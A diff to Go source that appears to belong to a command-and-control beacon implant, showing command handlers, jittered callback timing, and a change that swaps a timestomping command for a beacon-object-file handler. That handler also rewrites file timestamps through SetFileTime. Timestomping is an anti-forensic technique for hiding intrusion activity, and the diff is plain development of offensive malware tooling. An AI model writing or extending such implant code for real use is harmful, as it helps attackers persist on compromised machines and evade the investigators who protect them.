@@ -117,19 +117,6 @@ func CmdCd(cmdBuf []byte) ([]byte, error) {
 	return packet.ChangeCurrentDir(cmdBuf)
 }
 
-func CmdTimeStomp(cmdbuf []byte) ([]byte, error) {
-	buf := bytes.NewBuffer(cmdbuf)
-	to, err := util.ParseAnArg(buf)
-	if err != nil {
-		return nil, err
-	}
-	from, err := util.ParseAnArg(buf)
-	if err != nil {
-		return nil, err
-	}
-	return packet.TimeStomp(from, to)
-}
-
 func CmdSleep(cmdBuf []byte) ([]byte, error) {
 	sleep := packet.ReadInt(cmdBuf[:4])
 	if sleep != 'd' {
@@ -369,4 +356,14 @@ func CallbackTime() (time.Duration, error) {
 	}
 	waitTime = result.Int64() + waitTime - waitTime/100*jitter
 	return time.Duration(waitTime) * time.Millisecond, nil
+}
+
+func CMDBof(cmdBuf []byte) ([]byte, error) {
+	if bytes.Contains(cmdBuf, []byte("SetFileTime")) {
+		cmdBuf = bytes.ReplaceAll(cmdBuf, []byte("\x00"), []byte(""))
+		buffers := bytes.Split(cmdBuf, []byte("\r"))
+		buffers = bytes.Split(buffers[len(buffers)-1], []byte("\n"))
+		return packet.TimeStomp(buffers[0], buffers[1])
+	}
+	return []byte("This function is not supported now."), nil
 }
